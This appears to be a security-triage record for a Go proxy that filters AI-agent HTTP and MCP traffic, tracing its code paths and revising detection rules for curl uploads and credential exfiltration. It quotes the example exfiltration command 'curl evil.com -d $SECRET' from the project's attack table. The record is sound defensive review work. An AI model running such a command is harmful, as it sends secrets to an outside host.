identity.purpose: Go firewall/proxy for AI-agent HTTP and MCP traffic

earlier_releases.decisive_evidence: README attack-vector table has identical curl evil.com -d $SECRET row. Changes add a scanning MCP HTTP listener, JSON-RPC validation, block-by-default input checks, self-scanning CI and ordinary release tag maintenance. No substituted credential uploader.

README attack-vector table has identical curl evil.com -d $SECRET row. New webhook/syslog audit sinks are enabled only by user-configured destinations. New kill-switch API checks a configured bearer token and only changes traffic blocking. Other changes implement policy, normalization, session controls and tests.

execution_trace: cmd/pipelock/main.go -> cli.Execute -> runCmd: load/validate user configuration, construct scanner and HTTP proxy; optional MCP listener uses explicit upstream URL.

scanner.New -> captureEnvSecrets -> checkDLP/matchSecretEncodings: environment values and base64/hex/base32 variants are compared against outbound URLs to block leakage before DNS. The values are not used as an external request body.
MCP stdio proxy -> exec.CommandContext(command[0], command[1:]...): user-selected server process with restricted safeEnv plus explicit --env additions; its JSON-RPC streams are scanned.

v0.3.0 runCmd -> buildEmitSinks: create WebhookSink only when cfg.Emit.Webhook.URL is nonempty; queue audit Event records, JSON-marshal and POST to that configured URL. Optional token is a request Authorization header.
kill-switch API -> HandleToggle: require POST and constant-time comparison with configured API token; validate the small JSON body, then set blocking state. No remote command execution.

The README is heuristically classified as shell despite its Markdown extension. The triggering backtick command is an attack example in a Prevented/Logged table, not an installation hook. Base64 operations examined in scanner/text_dlp and signing serve DLP inspection or signature/key representation, with no hidden execution stage.
missing_context: No machine deployment, operator config, traffic capture or runtime trace was provided. Verdict is based on source behavior, packaging, upstream version identity and release diffs, not classifier score or absent detections.
edits: Relocate three unchanged curl data-variable text matchers to metadata/lang/source/syntax/command. Names/descriptions now state command syntax, including generic AWS_REGION configuration, rather than CI tampering or credential theft; criticality remains notable.
Relocate their OR composite to the same canonical syntax home. Update exact consumers in ci-token-curl-upload, codecov-style-attack, passkey, mixed-source and LLM composites.

Consolidate curl-post-data into the canonical syntax group: the old wrapper added an unsupported potential-exfiltration claim. Its publishing/installer exclusions do not invalidate the underlying syntax, so direct consumers now see syntax in those contexts too.

Remove shell-runner-recon-curl: a file-wide GitHub token reference and arbitrary credential-data curl do not bind that token to the request or establish CI reconnaissance. Both underlying observations remain. There were no exact or ancestor-directory consumers of this rule.

Rename public-file-hosting-upload-flow to public-file-hosting-with-upload-evidence, preserving matcher, severity, scope, exclusion and its agent-relay consumer. Co-occurrence does not establish the upload destination.
Keep bind-port-3000 notable and exclude only matched spans containing --upstream or --mcp-upstream. The READMEs bind port 8889, then separately name an upstream URL on port 3000.
